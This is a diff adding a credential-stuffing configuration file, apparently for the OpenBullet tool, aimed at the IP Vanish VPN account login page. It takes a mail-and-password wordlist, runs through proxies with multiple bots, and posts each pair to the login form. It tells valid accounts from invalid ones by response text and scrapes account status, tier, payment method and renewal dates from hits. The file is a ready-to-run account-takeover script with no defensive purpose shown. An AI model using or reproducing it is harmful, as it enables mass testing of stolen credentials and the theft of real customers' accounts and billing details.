@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "IP Vanish",
+  "SuggestedBots": 20,
+  "LastModified": "2018-05-06T02:23:54.6269624+02:00",
+  "AdditionalInfo": "Need to fix the \"ban proxies after\" amount",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 10,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://account.ipvanish.com/index.php" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&webLogin=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, invalid credentials." 
+    KEY "reactivate your service" 
+  KEYCHAIN Success OR 
+    KEY "Account Status:" 
+#CAPTURE_STATUS PARSE "<SOURCE>" LR "Account Status:</b></span>" "<" Recursive=FALSE -> CAP "Status" "" "" 
+#CAPTURE_TIER PARSE "<SOURCE>" LR "Current Tier:</b></span>" "<" Recursive=FALSE -> CAP "Tier" "" "" 
+#CAPTURE_PAYMENT_METHOD PARSE "<SOURCE>" LR "Payment Method:</b></span>" "<" Recursive=FALSE -> CAP "Payment Method" "" "" 
+#CAPTURE_DEACTIVATION_DATE PARSE "<SOURCE>" LR "Deactivation Date:</b></span>" "<" Recursive=FALSE -> CAP "Deactivation date" "" "" 
+#CAPTURE_RENEWAL_DATE PARSE "<SOURCE>" LR "Renewal Date:</b></span>" "<" Recursive=FALSE -> CAP "Renewal date" "" "" 
